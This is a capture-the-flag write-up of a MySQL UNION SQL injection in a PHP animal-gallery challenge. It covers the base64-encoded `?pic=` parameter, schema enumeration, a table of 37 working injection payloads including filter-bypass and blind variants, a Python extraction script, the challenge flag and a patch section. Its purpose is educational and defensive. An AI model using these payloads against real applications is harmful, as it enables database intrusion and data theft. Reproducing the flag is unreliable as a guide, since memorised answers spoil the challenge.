# Critter Gallery — SQL Injection Write-up

**Intigriti — September 2026 CTF**
A cute animal gallery hiding a one-column UNION injection.

Write-up by [**Rajib Mahmud**](https://github.com/Rajib-Mahmud)

| | |
|---|---|
| **Target** | `challenge-0926.challenges.intigriti.io` |
| **Category** | SQL Injection |
| **Challenge author** | [khanhdlq](https://x.com/khanhdlq) |
| **Write-up by** | [Rajib Mahmud](https://github.com/Rajib-Mahmud) |
| **Stack** | PHP 8.2 · MySQL 8.0 |
| **Flag** | `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}` |

---

## Overview

The target is a small PHP app, **Critter Gallery** — a grid of eight animals. Each tile loads a detail view through a `?pic=` parameter carrying a **base64-encoded** animal name.

```
https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Zm94
                                                              └── base64("fox")
```

The decoded value is consumed server-side. The whole challenge is finding out *where* it lands.

## Recon

The gallery markup hands us the encoding scheme:

```html
<a href="?pic=Zm94">      <!-- fox -->
<a href="?pic=cGFuZGE=">  <!-- panda -->
<a href="?pic=bGlvbg==">  <!-- lion -->
```

And the headers leak the stack:

```
$ curl -sI .../challenge.php | grep -i powered
x-powered-by: PHP/8.2.33
server: istio-envoy
```

## Discovery

Encode a single quote — `fox'` → `Zm94Jw==` — and fire it:

```
$ curl -s ".../challenge.php?pic=Zm94Jw=="
HTTP 200 · 0 bytes  ← query broke
```

A broken query returns an empty body. Escaping the quote (`fox''`) restores the 4090-byte page. **SQL injection confirmed.**

### Column count

| Payload | Result |
|---|---|
| `x' UNION SELECT null-- ` | 4123 B ✓ |
| `x' UNION SELECT null,null-- ` | 0 B ✗ |

One column. A clean UNION channel straight into the rendered page.

## Exploitation

**1. Confirm**
```
fox' → base64 → Zm94Jw==
→ 200, 0 bytes = error
```

**2. Fingerprint**
```sql
x' UNION SELECT version()--   → 8.0.46
x' UNION SELECT database()--  → critter_gallery
```

**3. Enumerate**
```sql
x' UNION SELECT group_concat(table_name) FROM
  information_schema.tables WHERE table_schema=database()--
→ animals, secret_vault

x' UNION SELECT group_concat(column_name) FROM
  information_schema.columns WHERE table_name='secret_vault'--
→ id, note
```

**4. Exfil**
```sql
x' UNION SELECT note FROM secret_vault LIMIT 1--
→ INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

## Loot

**animals**
```
1|fox|The red fox is a clever, highly adaptable hunter.
2|panda|Giant pandas spend most of the day munching bamboo.
3|lion|Lions are the only truly social of the big cats.
4|penguin|Penguins are flightless birds of the southern seas.
5|otter|Sea otters hold hands while they sleep so they do not drift apart.
6|koala|Koalas sleep up to twenty hours a day.
7|owl|Owls can rotate their heads around 270 degrees.
8|tiger|Tigers are the largest of all wild cats.
```

**secret_vault**
```
1 | INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

**host**

| | |
|---|---|
| db user | `gallery@10.18.49.50` |
| hostname | `db-7df4c4d979-qvq6s` · k8s pod |
| os | Linux |
| mysql | 8.0.46 Community (GPL) |
| databases visible | `critter_gallery`, `information_schema`, `performance_schema` |
| port / socket | `3306` · `/var/run/mysqld/mysqld.sock` |
| datadir / tmpdir | `/var/lib/mysql/` · `/tmp` |
| charset / timezone | `utf8mb4` · `SYSTEM` |
| server uuid | `ab64aa3b-b5a5-11f1-860b-b627227199c4` |
| secure_file_priv | `/var/lib/mysql-files/` — LOAD_FILE / OUTFILE blocked |

## Arsenal

The injection point is wildly permissive. All **37 techniques** below were tested live against the target and confirmed working — the full method list, not a sample.

**Direct extraction · single request (20)**

| # | Method | Payload |
|---|---|---|
| 01 | UNION SELECT | `x' UNION SELECT note FROM secret_vault LIMIT 1-- ` |
| 02 | UNION ALL SELECT | `x' UNION ALL SELECT note FROM secret_vault LIMIT 1-- ` |
| 03 | UNION DISTINCT SELECT | `x' UNION DISTINCT SELECT note FROM secret_vault LIMIT 1-- ` |
| 04 | `/**/` comment bypass | `x'/**/UNION/**/SELECT/**/note/**/FROM/**/secret_vault-- ` |
| 05 | Tab-separated keywords | `x'\tUNION\tSELECT\tnote\tFROM\tsecret_vault-- ` |
| 06 | Newline-separated keywords | `x'\nUNION\nSELECT\nnote\nFROM\nsecret_vault-- ` |
| 07 | JSON_OBJECT() | `x' UNION SELECT JSON_OBJECT('flag',note) FROM secret_vault-- ` |
| 08 | Hex-encoded string literal | `... WHERE note LIKE 0x494e544947524954497b2525-- ` |
| 09 | Subquery in SELECT | `x' UNION SELECT (SELECT note FROM secret_vault LIMIT 1)-- ` |
| 10 | Subquery, no spaces | `x'UNION(SELECT(note)FROM(secret_vault)LIMIT 1)-- ` |
| 11 | SUBSTR() / MID() | `x' UNION SELECT SUBSTR(note,1,50) FROM secret_vault-- ` |
| 12 | ELT() | `x' UNION SELECT ELT(1,note) FROM secret_vault-- ` |
| 13 | MAKE_SET() / COALESCE() / IFNULL() | `x' UNION SELECT COALESCE(note,'null') FROM secret_vault-- ` |
| 14 | HTTP Parameter Pollution | `?pic=<b64 fox>&pic=<b64 sqli>` — second `pic=` wins |
| 15 | `#` comment terminator | `x' UNION SELECT note FROM secret_vault LIMIT 1#` |
| 16 | `-- -` comment terminator | `x' UNION SELECT note FROM secret_vault LIMIT 1-- -` |
| 17 | `/*!50000*/` versioned comment | `x' /*!50000UNION*/ /*!50000SELECT*/ note FROM secret_vault-- ` |
| 18 | `/*! */` inline comment | `x'/*!UNION SELECT note FROM secret_vault LIMIT 1*/-- ` |
| 19 | Mixed case | `x' uNiOn SeLeCt note FrOm secret_vault-- ` |
| 20 | Session variable assignment | `x' UNION SELECT @v:=(SELECT note FROM secret_vault LIMIT 1)-- ` |

**Boolean blind · page-size delta (11)**

| # | Method | true (B) | false (B) |
|---|---|---|---|
| 21 | IF() | 4136 | 4122 |
| 22 | CASE WHEN | 4158 | 4144 |
| 23 | STRCMP() | 4138 | 4124 |
| 24 | BETWEEN | 4154 | 4140 |
| 25 | ASCII()=value | 4124 | 4111 |
| 26 | String comparison `>` | 4134 | 4120 |
| 27 | REGEXP | 4137 | 4122 |
| 28 | COUNT(*) | 4144 | 4129 |
| 29 | EXISTS() | 4141 | 4126 |
| 30 | XOR | 4131 | 4447 |
| 31 | NOT IN | 4137 | 0 |

**Time-based blind (3)**

| # | Method | hit | miss |
|---|---|---|---|
| 32 | IF() + SLEEP() | 2.6s | 0.5s |
| 33 | CASE WHEN + SLEEP() | 2.6s | 0.6s |
| 34 | Heavy query / cartesian product (no SLEEP) | 5.8s | 0.6s |

**Encoding / bitwise extraction (3)**

| # | Method | Result |
|---|---|---|
| 35 | HEX() → offline decode | `494E5449...` → decode to flag |
| 36 | ASCII()/ORD() char-by-char | `73` → `I`, byte by byte |
| 37 | ORD()=N boolean check | `IF(ORD(SUBSTRING(note,1,1))=73,'YES','NO')` |

### Tested and blocked

| Vector | Result |
|---|---|
| Error-based (`extractvalue`, `updatexml`, `exp()` overflow, `floor(rand())` GROUP BY, `geometrycollection()`) | PHP suppresses SQL errors — no output channel |
| Stacked queries / `PREPARE` + `EXECUTE` | Driver blocks multi-statement execution |
| `LOAD_FILE()` / `INTO OUTFILE` | No `FILE` privilege; `secure_file_priv` locked to `/var/lib/mysql-files/`; write succeeds but read-back fails |
| Header injection (User-Agent, Referer, X-Forwarded-For, X-Real-IP, Cookie) | Not reflected into the query — only `?pic=` is |
| POST body / JSON body `pic=` | Endpoint reads the query string only |
| URL-encoded space (`%20`) in place of a literal space | Breaks the payload before it reaches MySQL |
| `DO SLEEP()` | Syntax error in this context |
| Alternate endpoints (`/api.php`, `/admin.php`, `/flag.php`, `/.env`, …) | All `404` |
| `mysql.user` table read | No cross-schema privilege beyond `information_schema` |

The `gallery` DB user is otherwise well-scoped: no file I/O, no stacked queries, no RCE path. The exposure is entirely the missing input sanitization on `?pic=`.

## PoC

See [`poc.py`](poc.py) for the full extraction chain, and [`poc_all_methods.py`](poc_all_methods.py) for a live demonstration of all six exploitation classes (UNION, JSON_OBJECT, hex encoding, boolean blind, time-based blind, heavy-query blind).

```python
#!/usr/bin/env python3
import base64, urllib.parse, urllib.request, re

TARGET = "https://challenge-0926.challenges.intigriti.io/challenge.php"

def inject(payload):
    b64  = base64.b64encode(payload.encode()).decode()
    url  = f"{TARGET}?pic={urllib.parse.quote(b64)}"
    resp = urllib.request.urlopen(url, timeout=10).read().decode()
    m    = re.search(r'class="desc">(.*?)</div>', resp, re.DOTALL)
    return re.sub(r"<br/?>", "", m.group(1)).strip() if m else ""

print(inject("x' UNION SELECT version()-- "))                    # 8.0.46
print(inject("x' UNION SELECT note FROM secret_vault LIMIT 1-- ")) # FLAG
```

## Patch

**Parameterize**
```php
// vulnerable
$name = base64_decode($_GET['pic']);
$db->query("SELECT description FROM animals WHERE name = '$name'");

// fixed
$stmt = $db->prepare("SELECT description FROM animals WHERE name = ?");
$stmt->bind_param("s", $name);
```

**Allowlist**
```php
$ok = ['fox','panda','lion','penguin','otter','koala','owl','tiger'];
if (!in_array($name, $ok, true)) { showNotFound(); exit; }
```

> **Least privilege.** The `gallery` user reads `information_schema` and `secret_vault`. Grant it `SELECT` on `animals` only — then a UNION leaks nothing worth having.

## References

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger — SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [MySQL 8.0 — UNION](https://dev.mysql.com/doc/refman/8.0/en/union.html)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

Write-up by [Rajib Mahmud](https://github.com/Rajib-Mahmud) · Intigriti Sep 2026 · flag via 1-column UNION SQLi
